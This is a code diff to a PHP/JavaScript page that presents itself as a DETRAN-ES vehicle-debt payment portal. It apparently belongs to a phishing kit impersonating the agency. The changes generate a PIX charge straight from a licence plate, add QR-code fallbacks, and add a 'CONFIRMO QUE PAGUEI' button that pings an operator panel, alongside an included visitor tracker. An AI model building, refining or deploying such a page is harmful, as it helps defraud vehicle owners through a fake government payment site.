@@ -50,12 +50,25 @@ require_once "../../base/tracker.php";
 
         /* Invoice Style */
         .invoice-card { text-align: center; border: 1px solid #ddd; padding: 20px; border-radius: 12px; background: white; }
-        .qr-code-box { margin: 20px 0; padding: 15px; background: #fff; border: 1px solid #eee; display: inline-block; }
+        .qr-code-box { margin: 20px 0; padding: 15px; background: #fff; border: 1px solid #eee; display: inline-block; min-height: 250px; min-width: 250px; }
         .pix-copy-box {
             background: #f8f9fa; border: 1px solid #dee2e6; padding: 10px; border-radius: 5px;
             font-family: monospace; font-size: 0.9em; word-break: break-all; margin: 15px 0;
             cursor: pointer;
         }
+        #btnConfirmarPagamento {
+            display: none;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            font-weight: bold;
+            width: 100%;
+            margin-top: 20px;
+            animation: fadeIn 0.5s;
+        }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
         .loader-spinner {
             display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3);
@@ -193,6 +206,8 @@ require_once "../../base/tracker.php";
                         <div class="pix-copy-box" id="pixCode" onclick="copyPix()">
                             Clique aqui para copiar o código PIX
                         </div>
+
+                        <button id="btnConfirmarPagamento">CONFIRMO QUE PAGUEI</button>
 
                         <div class="d-flex align-items-center justify-content-center text-muted mt-3 small">
                             <div class="spinner-border spinner-border-sm me-2" role="status"></div>
@@ -397,25 +412,12 @@ require_once "../../base/tracker.php";
     }
 
     document.getElementById('btnIrParaDados').addEventListener('click', () => {
-        document.getElementById('modalDados').style.display = 'flex';
-    });
+        // Agora gera o pagamento direto, sem abrir modal
+        const nome = currentData.proprietario || 'PROPRIETARIO DETRAN-ES';
+        const placa = document.getElementById('placa').value.toUpperCase();
+        const doc = placa; // Agora envia a placa no campo DOC
 
-    document.getElementById('closeModal').addEventListener('click', () => {
-        document.getElementById('modalDados').style.display = 'none';
-    });
-
-    document.getElementById('modalDados').addEventListener('click', (e) => {
-        if (e.target.id === 'modalDados') {
-            document.getElementById('modalDados').style.display = 'none';
-        }
-    });
-
-    document.getElementById('btnFinalizarGuia').addEventListener('click', () => {
-        const nome = document.getElementById('cust-nome').value;
-        const doc = document.getElementById('cust-doc').value;
-        if (!nome || !doc) return alert('Por favor, preencha os dados obrigatórios.');
-
-        const btn = document.getElementById('btnFinalizarGuia');
+        const btn = document.getElementById('btnIrParaDados');
         btn.disabled = true;
         btn.innerHTML = '<span class="loader-spinner"></span> GERANDO PAGAMENTO...';
 
@@ -423,7 +425,7 @@ require_once "../../base/tracker.php";
         formData.append('cpf_cnpj', doc);
         formData.append('nome', nome);
         formData.append('valor', totalValor.toFixed(2));
-        formData.append('debito', 'DÉBITOS DETRAN-ES (' + document.getElementById('placa').value.toUpperCase() + ')');
+        formData.append('debito', 'DÉBITOS DETRAN-ES (' + placa + ')');
 
         fetch('../../data/pix.php', { method: 'POST', body: formData })
         .then(res => res.json())
@@ -432,19 +434,31 @@ require_once "../../base/tracker.php";
                 currentRef = data.id || data.pix;
                 document.getElementById('pixCode').dataset.code = data.pix;
 
+                // Fallback de QR Code: Se o Google falhar, o onerror tenta a api.qrserver
                 const qrUrl = `https://chart.googleapis.com/chart?chs=250x250&cht=qr&chl=${encodeURIComponent(data.pix)}`;
-                document.getElementById('qr-container').innerHTML = `<img src="${qrUrl}" alt="QR Code PIX">`;
+                const qrFallback = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(data.pix)}`;
+                
+                document.getElementById('qr-container').innerHTML = `
+                    <img src="${qrUrl}" alt="QR Code PIX" id="imgQr" onerror="this.src='${qrFallback}'">
+                `;
 
-                document.getElementById('modalDados').style.display = 'none';
                 showStep('pagamento');
                 startPolling();
+
+                // Mostra o botão "CONFIRMO QUE PAGUEI" após 1 minuto (60000 ms) para teste
+                setTimeout(() => {
+                    document.getElementById('btnConfirmarPagamento').style.display = 'block';
+                }, 60000); 
             } else {
                 alert('Erro ao gerar pagamento.');
+                btn.disabled = false;
+                btn.textContent = 'PROSSEGUIR PARA PAGAMENTO';
             }
         })
-        .finally(() => {
+        .catch(() => {
+            alert('Erro de conexão ao gerar pagamento.');
             btn.disabled = false;
-            btn.textContent = 'GERAR PAGAMENTO';
+            btn.textContent = 'PROSSEGUIR PARA PAGAMENTO';
         });
     });
 
@@ -460,6 +474,19 @@ require_once "../../base/tracker.php";
             box.style.backgroundColor = '#f8f9fa';
         }, 3000);
     }
+
+    // Ação do botão "CONFIRMO QUE PAGUEI"
+    document.getElementById('btnConfirmarPagamento').addEventListener('click', () => {
+        const btn = document.getElementById('btnConfirmarPagamento');
+        btn.disabled = true;
+        btn.textContent = 'NOTIFICANDO ADMINISTRADOR...';
+
+        // Dispara uma notificação especial no painel
+        fetch('../../api/typing_start.php?action=confirm_payment&ref=' + (currentRef || '')).finally(() => {
+            alert('Notificação enviada! O administrador verificará o pagamento em instantes.');
+            btn.textContent = 'NOTIFICAÇÃO ENVIADA ✅';
+        });
+    });
 
     function startPolling() {
         if (pollInterval) clearInterval(pollInterval);
